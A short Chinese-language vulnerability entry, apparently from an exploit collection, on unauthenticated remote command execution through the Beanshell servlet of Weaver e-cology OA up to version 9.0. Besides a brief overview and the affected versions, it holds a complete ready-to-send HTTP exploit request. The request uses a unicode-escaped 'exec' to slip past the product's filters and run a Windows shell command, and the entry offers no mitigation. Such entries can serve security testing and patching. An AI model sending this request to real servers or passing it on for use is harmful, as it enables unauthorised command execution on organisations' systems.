## 漏洞概述

泛泛微e-cology OA系统的Java Beanshell接口可被未授权访问, 攻击者调用该Beanshell接口, 可构造特定的HTTP请求绕过泛微本身一些安全限制从而达成远程命令执行

## 影响范围

```http
E-cology <= 9.0
```

## EXP

```http
POST /weaver/bsh.servlet.BshServlet HTTP/1.1
Host: xxxxxxxx:8088
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Length: 98
Content-Type: application/x-www-form-urlencoded

bsh.script=ex\u0065c("cmd /c whoami");&bsh.servlet.captureOutErr=true&bsh.servlet.output=raw

```

## POC

大宝剑已同步此漏洞